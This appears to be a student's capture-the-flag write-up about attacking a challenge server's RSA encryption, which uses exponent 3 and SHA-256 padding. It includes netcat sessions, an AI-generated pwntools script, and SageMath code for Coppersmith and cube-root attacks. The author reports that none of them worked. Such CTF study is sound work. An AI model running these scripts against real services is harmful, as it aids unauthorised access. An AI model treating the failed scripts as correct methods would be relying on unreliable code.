I again closed the port and this time typed 2:


vinayak@vinayak-Victus-by-HP-Gaming-Laptop-15-fa0xxx:~$ nc -v 3.109.250.1 5000
Connection to 3.109.250.1 5000 port [tcp/*] succeeded!


Find a string such that SHA-256 hash of "LbwSzK" concatenated with your input starts with the the string "59566".
1517850
1517850


    1. get first half code
    2. get second half code
    3. get flag
    What do you want ?
2
2
def main():
    if not proof():
        print("Check Failed!")
        return
    return_val = options()
    if return_val==1:
        f = open("./part1.py")
        print(f.read())
        return
    elif return_val==2:
        f = open("./part2.py")
        print(f.read())
        return
    elif return_val==3:
        byts = bytes_to_long(m)
        sys.stdout.write("Give me a padding: ")
        padding = input().strip()
        padding = int(sha256(padding.encode()).hexdigest(), 16)
        c = pow(byts + padding, e, n)
        print("Ciphertext : ", c)
    else : 
        print("Invalid")
        return 
        
        
if __name__ == '__main__':
    try:
        main()
    except:
        os._exit(-1)




So now I basically have the whole code as well as the number to decipher.


The code tells me how the system gives the ciphertext and the original number as well.


elif return_val==3:
    byts = bytes_to_long(m)
    sys.stdout.write("Give me a padding: ")
    padding = input().strip()
    padding = int(sha256(padding.encode()).hexdigest(), 16)
    c = pow(byts + padding, e, n)
    print("Ciphertext : ", c)






This shows how the ciphertext is gotten from the number n. We have 
 c = pow(byts + padding, e, n)
This means that c=(m+padding)^3 (mod n).
So I need to find a padding so that (m+padding)^3 is less than n. If that is the case then c will be a perfect cube and I can simply take the cube root to get m=c^(1/3)-padding
Where m will be the flag.
This is a low exponent attack in RSA(https://amsghimire.medium.com/low-exponent-attack-511bf5d227fc).


So I prompted Perplexity to write a script to do the following for multiple paddings:


-Open the port
-Solve the SHA-256 problem(Proof of Work)
-Type 3 
-Give a padding
-Get the ciphertext
-Check if c is a perfect cube. If it is, then the padding works.


It gave me this code:


from pwn import *
import hashlib
import gmpy2
from Crypto.Util.number import long_to_bytes


SERVER_HOST = '3.109.250.1'
SERVER_PORT = 5000


def solve_pow(prefix, target_prefix):
    charset = string.ascii_letters + string.digits
    for suffix in itertools.product(charset, repeat=5):
        suffix = ''.join(suffix)
        candidate = prefix + suffix
        if hashlib.sha256(candidate.encode()).hexdigest().startswith(target_prefix):
            return suffix
    raise ValueError("PoW failed. Increase suffix length.")


def try_padding(user_input):
    conn = remote(SERVER_HOST, SERVER_PORT)
    try:
        # Solve PoW
        conn.recvuntil(b'SHA-256 hash of "')
        prefix = conn.recvuntil(b'"', drop=True).decode()
        conn.recvuntil(b'starts with the string "')
        target_prefix = conn.recvuntil(b'"', drop=True).decode()
        suffix = solve_pow(prefix, target_prefix)
        conn.sendline(suffix.encode())


        # Send padding and get ciphertext
        conn.sendlineafter(b"What do you want ?", b"3")
        conn.sendlineafter(b"Give me a padding: ", user_input.encode())
        c_line = conn.recvline().decode().strip()
        c = int(c_line.split(": ")[1])
        return c
    finally:
        conn.close()


def main():
    padding_candidates = ["a", "b", "1", "0", "==", "aa", ""]
    for candidate in padding_candidates:
        print(f"[*] Trying: {candidate}")
        c = try_padding(candidate)
        m_plus_padding, is_cube = gmpy2.iroot(c, 3)
        if is_cube:
            padding = int(hashlib.sha256(candidate.encode()).hexdigest(), 16)
            m = m_plus_padding - padding
            flag = long_to_bytes(m).decode()
            print(f"\n[+] FLAG: {flag}")
            return


if __name__ == "__main__":
    main()


However, it didn’t work.


I tried running a few more scripts that Perplexity gave me but none of them worked. So I now resorted to brute force for small paddings.





vinayak@vinayak-Victus-by-HP-Gaming-Laptop-15-fa0xxx:~$ nc -v 3.109.250.1 5000
Connection to 3.109.250.1 5000 port [tcp/*] succeeded!


Find a string such that SHA-256 hash of "oiFLzr" concatenated with your input starts with the the string "14534".
148951
148951


    1. get first half code
    2. get second half code
    3. get flag
    What do you want ?
3
3
Give me a padding: a
a
Ciphertext :  13437526472436443794216183194447347160957723113505232847991141241583880843038226336449043767027140263491100275366830477382315100162269898139117823879024163779147153334574801452934062285034799866262819412019763506351855938963697133333731140499117951581916453863888513714012096235622954368877333530962808844185127979855566379770817498139428322638433709868001792616790648467050012348624173399559294965184993735286777990218356007723148727102527078729048718466769038729977962218852252655094563207374330913818477133600881142515177655174084565564427942083997563785081157620898856443894985136690469474067464648559140933929545
^C      
vinayak@vinayak-Victus-by-HP-Gaming-Laptop-15-fa0xxx:~$ nc -v 3.109.250.1 5000
Connection to 3.109.250.1 5000 port [tcp/*] succeeded!


Find a string such that SHA-256 hash of "sFASud" concatenated with your input starts with the the string "90244".
1046159
1046159


    1. get first half code
    2. get second half code
    3. get flag
    What do you want ?
3
3
Give me a padding: b
b
Ciphertext :  13437526472436443794216183194447347160957723113505232847990346252260193765921649380113208853280317584975215536397428706728873322423295906565776479598910954084166270057154599569925491720782494525238264705698983190662294154774036491067661439821148790364503855517693647392397257484830372073200709757814134785864705571701153981802788133514244378641554310062101103974655831408181376301645355095315127439706071932077295205188615950660705686622173545468864380158845606832127445971875574462991336358180344481523304403429277105788558521722134967061279206633024979121869426035291785922139720125637020404352908104921836185083121
^C  
vinayak@vinayak-Victus-by-HP-Gaming-Laptop-15-fa0xxx:~$ nc -v 3.109.250.1 5000
Connection to 3.109.250.1 5000 port [tcp/*] succeeded!


Find a string such that SHA-256 hash of "nmpaAt" concatenated with your input starts with the the string "13086".
^C
vinayak@vinayak-Victus-by-HP-Gaming-Laptop-15-fa0xxx:~$ nc -v 3.109.250.1 5000
Connection to 3.109.250.1 5000 port [tcp/*] succeeded!


Find a string such that SHA-256 hash of "eoAcqn" concatenated with your input starts with the the string "31201".
502472
502472


    1. get first half code
    2. get second half code
    3. get flag
    What do you want ?
3
3
Give me a padding: 


Ciphertext :  13437526472436443794216183194447347160957723113505232847991283306113138220233611623514675486755471564675075931597194667076873792845811434558940860307689650172282955143274192306001577300853176680328261740226949547911987455543505939653845201712932059038893061028957575004645827583641813162371882629998149720108335069599541193348406800042424174365046762703858102407067704226218281373815251886835573326793237064400000951951470185193154003949005186087250209039284390634476270161882475661058798807584719275674224312119320148958373939867137261912594006570054381723440237211976383733448993072751117624257934664093874010364945
^C
vinayak@vinayak-Victus-by-HP-Gaming-Laptop-15-fa0xxx:~$ nc -v 3.109.250.1 5000
Connection to 3.109.250.1 5000 port [tcp/*] succeeded!


Find a string such that SHA-256 hash of "fEKORa" concatenated with your input starts with the the string "60055".
143829
143829


    1. get first half code
    2. get second half code
    3. get flag
    What do you want ?
3
3
Give me a padding: 0
0
Ciphertext :  13437526472436443794216183194447347160957723113505232847990537484597214364461254725236231578028409205628532896102373976466083683889840534339119282416411100447318359966949824006689421404186742348951798174294813055116705263039935981529841118559344321945774780626487039435081178264499545778522980216616855019749731586010568502666752167352049568778673364831627346665954746461688496049302648328679930025585624544249598391555764547171626928540386957957549518841911537616722431465187008642766449369067365097076507474993328806567685674699045933763172208862899614531491969200226912337212523724436528753345466586891660131401121
^C
vinayak@vinayak-Victus-by-HP-Gaming-Laptop-15-fa0xxx:~$ nc -v 3.109.250.1 5000
Connection to 3.109.250.1 5000 port [tcp/*] succeeded!


Find a string such that SHA-256 hash of "bvciok" concatenated with your input starts with the the string "70616".
1741326
1741326


    1. get first half code
    2. get second half code
    3. get flag
    What do you want ?
3
3
Give me a padding: 1
1
Ciphertext :  13437526472436443794216183194447347160957723113505232847990603147292226928038102057351088581769825769065742799938562195899137207985168638686932973500805175120244776171552623797311717352445842354506839648768961557995566066583379882671063443061221126889161415626667882853789182863427348340550703864877348720316075406615895429590542123490206825841826084125675586562000477548391938871164802515094842964422894509501874136226610585205845061872299086431519078988424124896067831101905411828982263797227188944518022431818652500299284644830387239226510273289074636855097814995843282536891849770922688308317857032217413503938121
^C
vinayak@vinayak-Victus-by-HP-Gaming-Laptop-15-fa0xxx:~$ nc -v 3.109.250.1 5000
Connection to 3.109.250.1 5000 port [tcp/*] succeeded!


Find a string such that SHA-256 hash of "cxAeRs" concatenated with your input starts with the the string "75363".
106274
106274


    1. get first half code
    2. get second half code
    3. get flag
    What do you want ?
3
3
Give me a padding: 00
00
Ciphertext :  13437526472436443794216183194447347160957723113505232847991360482082351340605060141480906596077932014534700273204101246225789737682496270626461901368551751548357072911214440274474496318291352097588953309529141893966721924425167961348318531152865558823943514799497512821572222286690989815467080187469151130302990914422604724617438876382881218732517277078652013280505843404323147350165872090664116479633533003668282375988150760775660211675718337758518166336864302790243290404972212654393601291806048889393238281004092758697831579583824147293642133909582664997388926268420436211884416047740496493530140586993233993495996
^C
vinayak@vinayak-Victus-by-HP-Gaming-Laptop-15-fa0xxx:~$ nc -v 3.109.250.1 5000
Connection to 3.109.250.1 5000 port [tcp/*] succeeded!


Find a string such that SHA-256 hash of "LdfotJ" concatenated with your input starts with the the string "14522".
166166
166166


    1. get first half code
    2. get second half code
    3. get flag
    What do you want ?
3
3
Give me a padding: aa
aa
Ciphertext :  13437526472436443794216183194447347160957723113505232847990844165828517764753643756954662611900731616553362698110941071069068987892164662386157291761780112548130200623953699554810214955155939968616625469352555797062591748619894313538685246576306836852853723240315448437027395275550663083989245687829413798166130298810099713344691332751543235082804871854574773547323609277476951647961587110568137496308824569258726982933332348072356253096890054832203817349010841160234735513593540137491604420393663350806151480346171293490660094572771706442224160886403443930928169589699316137236683409699804865252362594956768893453540
^C
vinayak@vinayak-Victus-by-HP-Gaming-Laptop-15-fa0xxx:~$ nc -v 3.109.250.1 5000
Connection to 3.109.250.1 5000 port [tcp/*] succeeded!


Find a string such that SHA-256 hash of "uMsjAp" concatenated with your input starts with the the string "78945".
50442
50442


    1. get first half code
    2. get second half code
    3. get flag
    What do you want ?
3
3
Give me a padding: =
=
Ciphertext :  13437526472436443794216183194447347160957723113505232847990311698050154611300423101867188219494275254131616736479542889085940339383240860893470719202145036385091943871105038583597905478361201316522747353935885630064681812333696871424402774228428787126217070273871039724187674045709110179446841997645046735709089307101052738384095051458574745292259674350426032624720287016599681548810637301026226344623031806772593574250953171322337127259848209705406455846352694078791132296148322745738154437225386423115408961490611974890288016678090222453361485211556156678223834231590814167711170140798130276104923924423059577019465






I checked if any of them is a perfect cube, but got none to my disappointment.


Hence I feel that this method is very difficult to make work and I should use some other method.



Now GPT suggested me the following:
Coppersmith’s Attack (for small roots modulo n)
(SageMath has built-in tools or libraries like ROCA or Rational Reconstruction that can help here.)
Use Håstad’s Broadcast Attack

I tried the first on https://sagecell.sagemath.org/ 


#SAGEMATH CODE
from sage.all import *


#Known values
n = 14396996159484935402263047209515591837894561722637754977347763291309469526016654395830492184143403002427443166570907471043582253894111865750271913633299048451358715658977476227178780148897263675642352138870807635707152157265878868071156485130358955177740064371871540690429629376357175922832896148083749207758979817755416407370097422607094461094843394269367378266138773192483991105300836363325123386715060503986689730021660330714714902229408932007554015453954776067969393448087791858215409782993160037667631348054614116602892854843905177862655435919982681383061296616680660139810652785553456917773787057033714145613047
c = 13437526472436443794216183194447347160957723113505232847991283306113138220233611623514675486755471564675075931597194667076873792845811434558940860307689650172282955143274192306001577300853176680328261740226949547911987455543505939653845201712932059038893061028957575004645827583641813162371882629998149720108335069599541193348406800042424174365046762703858102407067704226218281373815251886835573326793237064400000951951470185193154003949005186087250209039284390634476270161882475661058798807584719275674224312119320148958373939867137261912594006570054381723440237211976383733448993072751117624257934664093874010364945
known_part = 0x50436c75627b  # "PClub{" in hex
padding = 0xe3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  # SHA256 of ""


#Shift length for unknown part (adjust based on expected flag length)
unknown_bits = (30 - 6) * 8  # e.g., 30-character flag, 6 known ("PClub{")
F.<x> = PolynomialRing(Zmod(n), implementation='NTL')
f = (known_part * (2**unknown_bits) + x + padding)^3 - c
f = f.monic()


#Coppersmith parameters
beta = 0.5  # Expected root size relative to n
XX = 2**unknown_bits  # Upper bound for x


roots = f.small_roots(XX, beta=beta)
if roots:
    x = roots[0]
    flag = (known_part * (2**unknown_bits) + x + padding)
    print(bytes.fromhex(hex(flag)[2:]))
else:
    print("No roots found. Adjust unknown_bits.")
But got no roots.


For Hastad method, it is basically solving by Chinese remainder theorem


I tried factorising n using https://www.alpertron.com.ar/ECM.HTM but even after running for a long time, it couldn’t factor it.


I found a link which lists all the attacks I can try:
https://www.utc.edu/sites/default/files/2021-04/course-paper-5600-rsa.pdf


My problem is of low public exponent.


I tried Coppersmith using Perplexity and sagemath, but didn’t work.:




n = 14396996159484935402263047209515591837894561722637754977347763291309469526016654395830492184143403002427443166570907471043582253894111865750271913633299048451358715658977476227178780148897263675642352138870807635707152157265878868071156485130358955177740064371871540690429629376357175922832896148083749207758979817755416407370097422607094461094843394269367378266138773192483991105300836363325123386715060503986689730021660330714714902229408932007554015453954776067969393448087791858215409782993160037667631348054614116602892854843905177862655435919982681383061296616680660139810652785553456917773787057033714145613047
c = 13437526472436443794216183194447347160957723113505232847991283306113138220233611623514675486755471564675075931597194667076873792845811434558940860307689650172282955143274192306001577300853176680328261740226949547911987455543505939653845201712932059038893061028957575004645827583641813162371882629998149720108335069599541193348406800042424174365046762703858102407067704226218281373815251886835573326793237064400000951951470185193154003949005186087250209039284390634476270161882475661058798807584719275674224312119320148958373939867137261912594006570054381723440237211976383733448993072751117624257934664093874010364945  # Replace with your ciphertext


#Known prefix of the flag (e.g., "PClub{")
known_part = int.from_bytes(b'PClub{', byteorder='big')


#SHA256 hash of empty string (precomputed)
padding = 0xe3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855


#Estimated flag length (adjust based on CTF hints)
flag_length = 30  # e.g., 30 characters
unknown_bytes = flag_length - len(b'PClub{')  # 24 bytes
shift = unknown_bytes * 8  # Bits to shift for the unknown part


#Coppersmith's Attack
P.<x> = PolynomialRing(Zmod(n), implementation='NTL')
f = (known_part * (2^shift) + x + padding)^3 - c
f = f.monic()


#Find small roots (adjust beta and epsilon if needed)
roots = f.small_roots(X=2^shift, beta=0.3, epsilon=0.05)
if roots:
    x = roots[0]
    flag_int = known_part * (2^shift) + x + padding
    flag = flag_int.to_bytes((flag_int.bit_length() + 7) // 8, byteorder='big').decode(errors='ignore')
    print("Flag:", flag)
else:
    print("No roots found. Adjust flag_length or parameters.")


Next method is trying c+kn to be a cube root.:
n = 14396996159484935402263047209515591837894561722637754977347763291309469526016654395830492184143403002427443166570907471043582253894111865750271913633299048451358715658977476227178780148897263675642352138870807635707152157265878868071156485130358955177740064371871540690429629376357175922832896148083749207758979817755416407370097422607094461094843394269367378266138773192483991105300836363325123386715060503986689730021660330714714902229408932007554015453954776067969393448087791858215409782993160037667631348054614116602892854843905177862655435919982681383061296616680660139810652785553456917773787057033714145613047
padding = 0xe3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  # SHA256 of ""


for k in range(0, 10):  # Try k=0,1,...,9
    candidate = c + k * n
    root, is_cube = candidate.nth_root(3, truncate_mode=True)
    if is_cube:
        m = root - padding
        flag = m.to_bytes((m.bit_length() + 7) // 8, byteorder='big').decode(errors='ignore')
        if "PClub{" in flag:
            print(f"Flag found with k={k}: {flag}")
            break
else:
    print("Flag not found. Increase the range of k.")




Which also didn’t work.


Next I tried  Franklin-Reiter Related Message Attack which also didn’t work:
# FLAG 6


Trying to open the challenge file from https://cybersharing.net/s/327d3991cd34b223
I typed cat and got a lot of non printable characters.
Next I tried string challenge | less and xxd challenge | less
Both still gave too much text to work with.
I tried binwalk challenge but it crashed.
